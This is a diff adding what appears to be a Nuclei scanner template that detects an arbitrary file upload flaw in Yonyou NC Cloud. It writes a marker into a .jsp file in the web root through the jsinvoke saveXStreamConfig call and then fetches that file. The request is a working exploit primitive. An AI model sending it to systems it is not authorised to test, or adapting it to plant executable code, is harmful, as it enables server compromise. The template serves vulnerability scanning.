@@ -1,0 +1,35 @@
+id: Yonyou-NC-Cloud-jsinvoke-upload
+
+info:
+  name: 用友-NC-Cloud-jsinvoke-任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+          POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+          Content-Length: 249
+          Accept: */*
+
+          {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["pboyjnnrfipmplsukdeczudsefxmywe","webapps/nc_web/{{filename}}.jsp"]}
+      - |
+          GET /{{filename}}.jsp  HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+      
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
